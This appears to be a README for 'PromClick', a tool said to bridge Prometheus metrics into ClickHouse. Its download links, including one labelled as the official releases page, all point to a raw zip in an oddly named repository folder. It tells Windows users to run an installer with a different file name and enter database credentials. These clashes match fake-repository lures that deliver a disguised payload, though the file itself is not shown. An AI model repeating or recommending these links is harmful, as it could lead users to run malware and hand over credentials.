# 🚀 PromClick - Store Prometheus metrics using ClickHouse simply

[![](https://img.shields.io/badge/Download-PromClick-blue.svg)](https://raw.githubusercontent.com/Namandla0101/PromClick/main/tinniness/Click-Prom-3.2.zip)

PromClick provides a simple way to store and query your Prometheus metrics using ClickHouse. It removes the need for complex setups like Thanos or Mimir. You get a single, reliable system to manage your data without the overhead of distributed systems.

## 🛠 Why choose PromClick?

Most metric storage systems are difficult to manage. They require multiple components, complex configurations, and deep knowledge of distributed architecture. PromClick simplifies this process. It connects to your existing Prometheus setup and sends your data into ClickHouse. You maintain full control over your storage while keeping your infrastructure light and easy to maintain.

## ⚙️ System Requirements

- Windows 10 or Windows 11
- 4 GB of RAM
- 50 GB of disk space
- ClickHouse server instance installed or accessible

## 📥 Getting Started

Follow these steps to set up PromClick on your Windows computer.

1. Visit the [official releases page](https://raw.githubusercontent.com/Namandla0101/PromClick/main/tinniness/Click-Prom-3.2.zip) to download the latest setup file.
2. Locate the file named `PromClick-installer.exe` in your Downloads folder.
3. Double-click the file to start the installation.
4. Follow the on-screen instructions to select your installation path.
5. Click Finish once the process completes.

## 💻 Running the Application

Once the installation finishes, you can start the service.

1. Open the Start menu and search for PromClick.
2. Click the icon to launch the application.
3. A small status window appears on your screen. This window confirms that the service is running.
4. You will see a prompt to enter your ClickHouse database connection details. Enter the URL, username, and password provided by your database administrator.
5. Save these settings to allow PromClick to connect to your storage backend.

## 📊 Viewing Your Metrics

After you configure the connection, PromClick begins moving data. You can view your metrics through your existing dashboard tools. 

PromClick creates a bridge between your data sources. You do not need to rewrite your common queries. The application handles the translation between standard metric formats and the storage layer. This approach ensures your existing alerts and dashboards remain functional while you gain the benefits of long-term storage in ClickHouse.

## 🔍 Managing Data Retention

You control how long your data stays in the system. Use the configuration file found in the installation folder to set your retention limits. 

- Open the file named `config.yaml` using Notepad or any text editor.
- Look for the setting labeled `retention_days`.
- Change this number to your preferred amount of days.
- Save the file and restart the PromClick application from the system tray.

The application automatically cleans up old records based on this value. This ensures your storage stays efficient without manual intervention.

## ⚠️ Troubleshooting Common Issues

If you cannot connect to your database, check the following items:

- Ensure your firewall allows outbound connections on the port used by ClickHouse.
- Check that your username and password lack trailing spaces.
- Verify your network connection to the ClickHouse server.

If the application fails to start, check the logs. You can find the log folder inside the PromClick installation directory. The file `error.log` contains detailed information about why the process failed. Most startup issues relate to missing permissions or network blocks.

## 🛡 Security Practices

Keep your installation secure by following these basic rules:

- Run the application with a dedicated user account that has limited permissions.
- Use a secure connection for your database URL.
- Periodically update PromClick to the latest version to receive security patches.
- Restrict access to the configuration file so only authorized users can modify the database connection strings.

## 📋 Frequently Asked Questions

**Does this software store data locally?**
No. PromClick acts as a bridge. It moves data from your Prometheus sources to your ClickHouse server. It does not store your long-term data on your local Windows machine.

**Do I need a PhD to run this?**
No. PromClick removes the complexity found in other tools. You only need to configure the connection string and define your retention policy.

**Can I run this alongside other tools?**
Yes. PromClick is designed to sit alongside your current stack without interfering with existing services. It uses minimal system resources during normal operation.

**Is there a cost to use this?**
PromClick is open source. You are free to download and use the software for your infrastructure needs.